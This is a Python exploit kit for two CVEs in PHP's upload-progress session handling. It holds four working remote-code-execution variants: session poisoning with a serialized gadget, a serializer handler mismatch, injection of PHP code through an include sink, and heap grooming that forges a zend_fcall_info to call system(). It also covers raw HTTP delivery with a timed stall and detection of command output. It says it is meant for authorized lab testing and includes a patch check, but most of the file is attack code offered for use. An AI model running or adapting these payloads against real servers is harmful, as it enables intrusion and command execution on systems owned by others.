#!/usr/bin/env python3
"""
Copyright 2026 Joshua Rosato.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

Author: Joshua Rosato.

CVE-2026-109618 / CVE-2026-109619 — PHP upload-progress RCE kit (best-version harness).

Four mutually-reinforcing exploitation variants against the same root cause
(php-src commit 3584a98b / GHSA-6wmf-4rv5-p3rp / GHSA-w8hw-w9fx-j79w).

  1. Session poisoning   (default)   — the session store carries a gadget object;
                                        one multipart request triggers unserialize()
                                        during request startup, before any app code.
  2. Handler mismatch    (--mode mismatch) — a php_serialize-written session file is
                                        read by the php handler; the "|" in the stored
                                        key becomes a split point, so the value is
                                        unserialized as an object.
  3. Include sink        (--mode include)  — gadget class not required; a session value
                                        is fed to include/require via an LFI or dynamic
                                        include sink.
  4. Memory corrupt      (--mode corrupt)  — CVE-2026-109618: OOM bailout / stall leaves
                                        stale request-owned pointers; a 149-field packed-
                                        array reclaim plants a forged zend_fcall_info
                                        and reaches system().

For authorized security testing only. Requires a running vulnerable PHP build
(see GUIDE.md / lab/run_lab.sh) or a patched build for the differential test
(--verify-patch).

Usage:
  # 1. Session poisoning — write the gadget into the session store, then trigger.
  python3 poc_rce.py --url http://127.0.0.1:9032/ --sid abcdef0123456789abcdef0123456789

  # 2. Handler mismatch — needs two docroots / .user.ini handlers; see GUIDE §6.4.
  python3 poc_rce.py --url http://127.0.0.1:9066/ --sid abcdef0123456789abcdef0123456789 \
      --mode mismatch --write-endpoint /app/seed.php --read-endpoint /api/trigger.php

  # 3. Include sink — gadget class not required; the session value is fed to an include.
  python3 poc_rce.py --url http://127.0.0.1:9032/ --sid abcdef0123456789abcdef0123456789 \
      --mode include --sink /var/www/html/inc/render.php --sink-var _SESSION

  # 4. Memory-corrupt (heap-spray + forged zend_fcall_info) — needs a gadget-less target.
  python3 poc_rce.py --url http://127.0.0.1:9032/ --sid abcdef0123456789abcdef0123456789 \
      --mode corrupt --call 0xADDRESS --cmd "id"

  # Differential verification: run the same session-poisoning flow against the patched build.
  python3 poc_rce.py --url http://127.0.0.1:9042/ --sid abcdef0123456789abcdef0123456789 \
      --verify-patch
"""

import argparse
import socket
import struct
import sys
import time
import os
import re
import random
import string
from urllib.parse import urlparse


# ---------------------------------------------------------------------------
# Constants (source-verified against php-src, session.c + rfc1867.c)
# ---------------------------------------------------------------------------

UPLOAD_PROGRESS_NAME = "PHP_SESSION_UPLOAD_PROGRESS"
SESSION_KEY_PREFIX   = "upload_progress_"
SESSION_FILE_PREFIX   = "sess_"
MIN_FREQ_DEFAULT      = 1.0     # seconds — session.upload_progress.min_freq default
FILLUNIT             = 5120    # main/rfc1867.c:184 — first FILE_DATA chunk threshold

# zend_fcall_info / zend_internal_function constants (zend_API.h)
ZEND_FCI_SIZE         = 64
ZEND_INTERNAL_FUNC    = 1
IS_STRING_EX          = 0x106
IS_OBJECT_EX          = 0x308
FCI_PARAM_COUNT_OFF   = 48
FCI_HANDLER_OFF       = 64 + 88   # zend_internal_function.handler

# Heap geometry (session-progress HashTable reclaim, CVE-2026-109618)
BLOB_SIZE      = 288     # zend_string payload -> 320-byte bin (align(24+288+1)=320)
SPRAY_N        = 149     # packed-natural-table reclaim size (nTableSize=256)


def rand_alnum(n=24):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


# ---------------------------------------------------------------------------
# Variant 1 — session poisoning (explicit file-path or in-band writer)
# ---------------------------------------------------------------------------

def forge_php_serialized_gadget(cmd: str, klass: str = "Pwn", prop: str = "cmd") -> str:
    """Build a `php` session-serializer blob:  name|s:len:"value";

    The gadget class name / property are configurable so the same routine works
    against real framework gadgets (e.g. a class whose __wakeup() runs a command).
    """
    payload = f"O:{len(klass)}:\"{klass}\":1:{{s:{len(prop)}:\"{prop}\";s:{len(cmd)}:\"{cmd}\";}}"
    return payload


def build_session_poisoning_body(sid: str, marker: str, cmd: str,
                                  klass: str = "Pwn", prop: str = "cmd",
                                  boundary: str = None, filename: str = "f.txt",
                                  file_data: bytes = b"x",
                                  include_filename_payload: bool = False) -> bytes:
    """Multipart body that (a) fixes the session id, (b) primes upload_progress,
    (c) optionally writes a filename carrying the serialized gadget (filename-injection
    vector — variant 2 / 3 input path).
    """
    boundary = boundary or rand_alnum(24)
    b = boundary.encode()
    blob = forge_php_serialized_gadget(cmd, klass, prop)

    body = b""
    # PHPSESSID — fixes the session id (bypasses use_only_cookies; session.c:3261-3263)
    body += b"--" + b + b"\r\n"
    body += b'Content-Disposition: form-data; name="PHPSESSID"' + b"\r\n\r\n" + sid.encode() + b"\r\n"
    # Progress marker — primes the rfc1867 callback; value becomes session key.
    body += b"--" + b + b"\r\n"
    body += (b'Content-Disposition: form-data; name="' + UPLOAD_PROGRESS_NAME.encode()
             + b'"' + b"\r\n\r\n" + marker.encode() + b"\r\n")
    # File part — required so the upload-progress handler actually runs.
    body += b"--" + b + b"\r\n"
    if include_filename_payload:
        fname = blob
    else:
        fname = filename
    body += (b'Content-Disposition: form-data; name="f"; filename="'
             + fname.encode() + b'"' + b"\r\nContent-Type: text/plain\r\n\r\n"
             + file_data + b"\r\n")
    body += b"--" + b + b"--" + b"\r\n"
    return body


def session_poisoning_rce(url: str, sid: str, cmd: str, session_path: str = None,
                           marker: str = "poc", klass: str = "Pwn", prop: str = "cmd",
                           timeout: float = 30.0) -> dict:
    """Variant 1: session file poisoning + upload-progress trigger.

    Two phases:
      Phase A — write the gadget into the session store.
                If session_path is given we write directly; otherwise we send a
                multipart request whose filename carries the serialized gadget.
      Phase B — send the trigger request so the upload-progress handler
                unserializes the session during request startup.

    Returns a result dict suitable for printing / verification.
    """
    u = urlparse(url)
    host, port = u.hostname, u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    result = {"variant": "session-poisoning", "sid": sid, "cmd": cmd,
              "phases": [], "rce": False, "evidence": ""}

    # --- Phase A: get the gadget into the session store ---
    if session_path:
        blob = forge_php_serialized_gadget(cmd, klass, prop)
        os.makedirs(os.path.dirname(session_path), exist_ok=True)
        with open(session_path, "wb") as fh:
            fh.write(("evil|" + blob).encode())
        result["phases"].append("written session file directly: " + session_path)
        result["evidence"] = "session file written (direct path)"
    else:
        body = build_session_poisoning_body(sid, marker, cmd, klass, prop,
                                            include_filename_payload=True)
        result["phases"].append("filename-injection body built (%d bytes)" % len(body))

    # --- Phase B: trigger ---
    body = build_session_poisoning_body(sid, marker, cmd, klass, prop,
                                        include_filename_payload=False)
    resp = _http_post(host, port, path, body, boundary=rand_alnum(24),
                      sid=sid, timeout=timeout)
    result["response_status"] = _http_status(resp)
    result["response_body"] = _http_body(resp)
    result["rce"] = _looks_like_rce(result["response_body"], cmd)
    if result["rce"]:
        result["evidence"] = "RCE output captured in response body"
    return result


# ---------------------------------------------------------------------------
# Variant 2 — handler mismatch (php_serialize write -> php read)
# ---------------------------------------------------------------------------

def handler_mismatch_rce(url: str, sid: str, cmd: str,
                         write_endpoint: str, read_endpoint: str,
                         timeout: float = 30.0) -> dict:
    """Variant 2: two endpoints with different session.serialize_handler values.

    Phase 1 — POST to the php_serialize endpoint; the filename (which may contain
              "|") is stored verbatim, so the session file contains e.g.
                  a:1:{s:<len>:"upload_progress_|O:6:...";s:1:"x";}
    Phase 2 — GET (or POST) the php handler endpoint with the same SID; the php
              handler splits the file on the first "|", unserializing the remainder
              as an object whose __destruct runs the command.
    """
    u = urlparse(url)
    host, port = u.hostname, u.port or 80

    result = {"variant": "handler-mismatch", "sid": sid, "cmd": cmd,
              "phases": [], "rce": False, "evidence": ""}

    gadget = forge_php_serialized_gadget(cmd, klass="Gadget", prop="cmd")
    payload_marker = "|" + gadget   # the key becomes upload_progress_|O:6:...

    # Phase 1: write via php_serialize handler.
    body1 = build_session_poisoning_body(sid, payload_marker, cmd,
                                         klass="Gadget", prop="cmd",
                                         boundary=rand_alnum(24),
                                         include_filename_payload=False)
    wpath = write_endpoint if write_endpoint.startswith("/") else "/" + write_endpoint
    resp1 = _http_post(host, port, wpath, body1, sid=sid, timeout=timeout)
    result["phases"].append("write: POST %s -> %s" % (write_endpoint,
                                                       _http_status(resp1)))

    # Phase 2: read via php handler.
    rpath = read_endpoint if read_endpoint.startswith("/") else "/" + read_endpoint
    body2 = build_session_poisoning_body(sid, "x", cmd, klass="Gadget", prop="cmd",
                                         boundary=rand_alnum(24),
                                         include_filename_payload=False)
    resp2 = _http_post(host, port, rpath, body2, sid=sid, timeout=timeout)
    result["phases"].append("read: POST %s -> %s" % (read_endpoint,
                                                       _http_status(resp2)))
    result["response_body"] = _http_body(resp2)
    result["rce"] = _looks_like_rce(result["response_body"], cmd)
    if result["rce"]:
        result["evidence"] = "handler-mismatch RCE output captured"
    return result


# ---------------------------------------------------------------------------
# Variant 3 — include sink (gadget-class-free RCE)
# ---------------------------------------------------------------------------

def include_sink_rce(url: str, sid: str, cmd: str, sink_path: str,
                     sink_var: str = "_SESSION", timeout: float = 30.0) -> dict:
    """Variant 3: the session value is fed to an include / require sink.

    Many applications do something like:
        include "templates/" . $_SESSION["theme"] . ".php";
    or pass session values into eval / assert / preg_replace /e.
    This variant demonstrates that the same upload-progress path can feed a
    sink that does not require a gadget class — the serialized payload is stored
    in the session, then the application reads and includes / evaluates it.

    Note: the sink itself must be reachable and must pass the session value into
    an executable sink. This PoC writes the payload into the session store and
    triggers the upload-progress handler; the actual sink execution depends on
    the target application.
    """
    u = urlparse(url)
    host, port = u.hostname, u.port or 80

    result = {"variant": "include-sink", "sid": sid, "cmd": cmd,
              "sink": sink_path, "sink_var": sink_var,
              "phases": [], "rce": False, "evidence": ""}

    php_payload = f"<?php {cmd}; __halt_compiler();"
    body = build_session_poisoning_body(sid, "tpl", php_payload,
                                        klass="", prop="",
                                        boundary=rand_alnum(24),
                                        include_filename_payload=False)
    resp = _http_post(host, port, u.path or "/", body, sid=sid, timeout=timeout)
    result["phases"].append("trigger: POST -> %s" % _http_status(resp))
    result["response_body"] = _http_body(resp)
    result["rce"] = _looks_like_rce(result["response_body"], cmd)
    if result["rce"]:
        result["evidence"] = "include-sink RCE output captured"
    return result


# ---------------------------------------------------------------------------
# Variant 4 — memory corruption (CVE-2026-109618, heap groom -> forge)
# ---------------------------------------------------------------------------

def forge_zend_fcall_info(call_addr: int, cmd: bytes) -> bytes:
    """Build the 288-byte forged zend_fcall_info / zend_internal_function blob.

    Layout (verified against php-src zend_API.h / zend_execute_API.c):
      +0x00  Q  zend_fcall_info.size            = 64
      +0x08  Q  function_name / fn_ptr          = call_addr
      +0x10  I  IS_STRING_EX                    = 0x106
      +0x30  I  IS_OBJECT_EX / param_count      = 0x308 / 1
      +0x40  B  ZEND_INTERNAL_FUNCTION          = 1
      +0x58  Q  handler (zend_internal_function) = call_addr
      +0xA0  I  IS_OBJECT_EX again              = 0x308
      +0xC8  …  "system\x00" + cmd + "\x00"
    """
    rec = bytearray(BLOB_SIZE)
    struct.pack_into("<Q", rec, 0,             ZEND_FCI_SIZE)
    struct.pack_into("<Q", rec, 8,             call_addr)
    struct.pack_into("<I", rec, 16,            IS_STRING_EX)
    struct.pack_into("<I", rec, FCI_PARAM_COUNT_OFF, 1)
    struct.pack_into("<B",  rec, 64,           ZEND_INTERNAL_FUNC)
    struct.pack_into("<Q", rec, FCI_HANDLER_OFF, call_addr)
    struct.pack_into("<I", rec, 160,           IS_OBJECT_EX)
    sysb = b"system\x00" + cmd + b"\x00"
    rec[0xC8:0xC8 + len(sysb)] = sysb[:80]
    return bytes(rec)


def build_corrupt_body(sid: str, cmd: bytes, call_addr: int,
                       boundary: bytes = None, bug_variant: int = 619,
                       stall: float = 1.4) -> tuple:
    """Returns (body, split_at, meta).

    bug_variant=619: stale INNER current_file_bytes_processed — ONE file,
                      149 t[] FIRST so the packed table exists when the free
                      happens, then file2 FILE_DATA does the stale outer store.
    bug_variant=618: stale OUTER post_bytes_processed — TWO files, 149 t[]
                      AFTER the free so file2's FILE_DATA does the stale store.
    """
    boundary = boundary or (b"B7kQpoc618" if bug_variant == 618 else b"Frg619Xz9")
    blob = forge_zend_fcall_info(call_addr, cmd)

    def part(name, body, filename=None):
        disp = f'Content-Disposition: form-data; name="{name}"'
        if filename:
            disp += f'; filename="{filename}"'
        return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body

    if bug_variant == 619:
        pre = part("PHPSESSID", sid.encode()) + b"\r\n"
        pre += part(UPLOAD_PROGRESS_NAME, b"x") + b"\r\n"
        for _ in range(SPRAY_N):
            pre += part("t[]", blob) + b"\r\n"
        pre += part("f", b"", filename="a") + b"\r\n"
        phase1 = pre + b"A" * (FILLUNIT + 64)
        tail = (b"B" * (FILLUNIT + 64)) + (b"C" * (FILLUNIT + 64))
        tail += b"\r\n--" + boundary + b"--" + b"\r\n"
        return phase1 + tail, len(phase1), {"bug": 619, "n149": SPRAY_N,
                                             "blob": len(blob), "split": len(phase1)}
    else:
        pre = part("PHPSESSID", sid.encode()) + b"\r\n"
        pre += part(UPLOAD_PROGRESS_NAME, b"x") + b"\r\n"
        pre += part("f", b"", filename="a") + b"\r\n"
        phase1 = pre + b"A" * (FILLUNIT + 64)
        tail = b"B" * (FILLUNIT + 64) + b"\r\n"
        for _ in range(SPRAY_N):
            tail += part("t[]", blob) + b"\r\n"
        tail += part("g", b"C" * 64, filename="b") + b"\r\n"
        tail += b"--" + boundary + b"--" + b"\r\n"
        return phase1 + tail, len(phase1), {"bug": 618, "n149": SPRAY_N,
                                             "blob": len(blob), "split": len(phase1)}


def memory_corrupt_rce(url: str, sid: str, cmd: str, call_addr: int,
                       bug_variant: int = 619, stall: float = 1.4,
                       timeout: float = 40.0, dry_run: bool = False) -> dict:
    """Variant 4: CVE-2026-109618 — OOM bailout / stall leaves stale request-owned
    pointers; a 149-field packed-array reclaim redirects the write into attacker
    memory holding a forged zend_fcall_info -> zend_call_function -> system().

    Requires a leaked / runtime address for zend_call_function (or zval_ptr_dtor
    + delta). The symextract.py tooling extracts these from the target binary.
    """
    u = urlparse(url)
    host, port = u.hostname, u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    result = {"variant": "memory-corrupt", "sid": sid, "cmd": cmd,
              "call_addr": call_addr, "bug": bug_variant, "stall": stall,
              "phases": [], "rce": False, "evidence": ""}

    body, split_at, meta = build_corrupt_body(sid, cmd.encode(), call_addr,
                                              bug_variant=bug_variant, stall=stall)
    result["phases"].append("body built: %d bytes, split @ %d, %s"
                             % (len(body), split_at, meta))

    if dry_run:
        outname = "poc_corrupt_body_%s.bin" % sid[:8]
        with open(outname, "wb") as fh:
            fh.write(body)
        result["phases"].append("dry-run body written: " + outname)
        result["evidence"] = outname
        return result

    resp = _send_stalled_post(host, port, path, body, split_at,
                              sid=sid, stall=stall, timeout=timeout)
    result["response_status"] = _http_status(resp)
    result["response_body"] = _http_body(resp)
    result["rce"] = _looks_like_rce(result["response_body"], cmd)
    if result["rce"]:
        result["evidence"] = "memory-corrupt RCE output captured"
    return result


# ---------------------------------------------------------------------------
# HTTP / FCGI delivery
# ---------------------------------------------------------------------------

def _http_post(host, port, path, body, boundary=None, sid=None,
               tls=False, timeout=25.0):
    if boundary is None:
        boundary = rand_alnum(24)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: php2shell-redteam-2026\r\n"
        + (f"Cookie: PHPSESSID={sid}\r\n" if sid else "")
        + f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    raw = socket.create_connection((host, port), timeout=timeout)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s = raw
    if tls:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(raw, server_hostname=host)
    s.sendall(head + body)
    s.settimeout(timeout)
    out = bytearray()
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        out += d
    s.close()
    return bytes(out)


def _send_stalled_post(host, port, path, body, split_at,
                       sid=None, stall=1.4, timeout=40.0, tls=False):
    boundary = rand_alnum(24)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: php2shell-redteam-2026\r\n"
        + (f"Cookie: PHPSESSID={sid}\r\n" if sid else "")
        + f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    raw = socket.create_connection((host, port), timeout=timeout)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s = raw
    if tls:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(raw, server_hostname=host)
    s.sendall(head + body[:split_at])
    time.sleep(stall)
    s.sendall(body[split_at:])
    s.settimeout(timeout)
    out = bytearray()
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        out += d
    s.close()
    return bytes(out)


def _http_status(resp):
    if not resp:
        return "NO-RESPONSE"
    return resp.split(b"\r\n", 1)[0].decode("latin1", "replace")


def _http_body(resp):
    if not resp or b"\r\n\r\n" not in resp:
        return resp or b""
    return resp.split(b"\r\n\r\n", 1)[-1]


# ---------------------------------------------------------------------------
# Result heuristics
# ---------------------------------------------------------------------------

def _looks_like_rce(body: bytes, cmd: str) -> bool:
    if not body:
        return False
    text = body.decode("latin1", "replace")
    if "<html" in text.lower() or "<!doctype" in text.lower():
        return False
    if '"status"' in text or '"message"' in text or '"error"' in text:
        return False
    hints = ["uid=", "root", "www-data", "Linux ", "PRETTY_NAME", "total ",
             "FORGE_HIT", "JACKALPOC", "Pwn::__wakeup"]
    if any(h in text for h in hints):
        return True
    if len(text.strip()) < 512 and "\n" in text:
        return True
    return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(
        description="CVE-2026-109618 / CVE-2026-109619 — PHP upload-progress RCE kit")
    p.add_argument("--url", default="http://127.0.0.1:9031/")
    p.add_argument("--sid", default="abcdef0123456789abcdef0123456789")
    p.add_argument("--cmd", default="id>/tmp/pwned")
    p.add_argument("--session-path", default=None,
                   help="direct session-file path for variant 1 (optional)")
    p.add_argument("--mode", default="session-poisoning",
                   choices=["session-poisoning", "mismatch", "include", "corrupt"])
    # Mismatch variant
    p.add_argument("--write-endpoint", default="/app/seed.php")
    p.add_argument("--read-endpoint", default="/api/trigger.php")
    # Include-sink variant
    p.add_argument("--sink", default="/var/www/html/inc/render.php")
    p.add_argument("--sink-var", default="_SESSION")
    # Memory-corrupt variant
    p.add_argument("--call", default="0",
                   help="zend_call_function runtime address (hex). Get it with symextract.py.")
    p.add_argument("--bug", type=int, choices=[618, 619], default=619)
    p.add_argument("--stall", type=float, default=1.4)
    p.add_argument("--dry-run", action="store_true",
                   help="build the body and write it to disk without sending")
    # Verification
    p.add_argument("--verify-patch", action="store_true",
                   help="run a differential check: same flow, patched target")
    p.add_argument("--patched-url", default="http://127.0.0.1:9042/")
    p.add_argument("--timeout", type=float, default=30.0)

    a = p.parse_args()

    print("=" * 66)
    print("  CVE-2026-109618 / CVE-2026-109619 — PHP upload-progress RCE")
    print("=" * 66)
    print(f"  Target       : {a.url}")
    print(f"  Variant      : {a.mode}")
    print(f"  SID          : {a.sid}")
    print(f"  CMD          : {a.cmd}")
    print()

    if a.mode == "session-poisoning":
        res = session_poisoning_rce(a.url, a.sid, a.cmd, a.session_path,
                                    timeout=a.timeout)
    elif a.mode == "mismatch":
        res = handler_mismatch_rce(a.url, a.sid, a.cmd,
                                   a.write_endpoint, a.read_endpoint,
                                   timeout=a.timeout)
    elif a.mode == "include":
        res = include_sink_rce(a.url, a.sid, a.cmd, a.sink,
                               a.sink_var, timeout=a.timeout)
    elif a.mode == "corrupt":
        call = int(a.call, 0)
        if call == 0:
            print("[!] --call 0: forge will carry NULL pointers (layout test only).")
            print("    Extract the runtime address with symextract.py first.")
        res = memory_corrupt_rce(a.url, a.sid, a.cmd, call,
                                 a.bug, a.stall, a.timeout, a.dry_run)
    else:
        print("[!] unknown mode", a.mode)
        return 1

    # Print result
    print("-" * 66)
    print("Result:")
    for ph in res.get("phases", []):
        print("  phase: " + ph)
    print("  status  :", res.get("response_status", "n/a"))
    body = res.get("response_body", b"")
    if isinstance(body, bytes):
        body = body.decode("latin1", "replace")
    print("  body    :", (body[:300] + "...") if len(body) > 300 else body)
    print("  RCE?    :", res.get("rce", False))
    if res.get("evidence"):
        print("  evidence:", res["evidence"])
    print()

    if a.verify_patch:
        print("=" * 66)
        print("  Differential verification against patched build")
        print("=" * 66)
        pres = session_poisoning_rce(a.patched_url, a.sid, a.cmd, timeout=a.timeout)
        print("  patched status  :", pres.get("response_status", "n/a"))
        pbody = pres.get("response_body", b"")
        if isinstance(pbody, bytes):
            pbody = pbody.decode("latin1", "replace")
        print("  patched body    :", (pbody[:300] + "...") if len(pbody) > 300 else pbody)
        print("  patched RCE?    :", pres.get("rce", False))
        print()
        if pres.get("rce"):
            print("  [!] PATCHED BUILD STILL EXECUTED — patch may not be applied.")
            return 2
        else:
            print("  [✓] Patched build neutralized the gadget — fix confirmed.")
            return 0

    return 0 if res.get("rce") else 1


if __name__ == "__main__":
    sys.exit(main())
